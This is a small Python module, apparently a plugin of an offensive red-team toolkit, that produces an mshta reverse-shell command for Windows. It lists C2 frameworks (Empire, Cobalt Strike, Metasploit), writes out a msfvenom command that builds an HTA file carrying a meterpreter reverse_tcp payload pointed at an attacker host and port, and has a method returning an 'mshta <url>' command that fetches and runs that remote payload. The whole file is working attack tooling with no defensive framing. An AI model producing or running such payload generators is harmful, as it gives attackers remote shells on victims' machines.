# encoding: utf8
from .config import *

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'mshta',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
C2         -> Empire
Language   -> Powershell
Platform   -> Win2008 over

C2         -> Cobalt 
Language   -> exe、vba、powershell
Platform   -> All

C2         -> Metasploit
Language   -> powershell
Platform   -> All
GenPayload -> msfvenom -f hta-psh -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o m.hta
""".format(lhost, port_msf)

    def reverse(self, url):
        return "mshta {0}".format(url)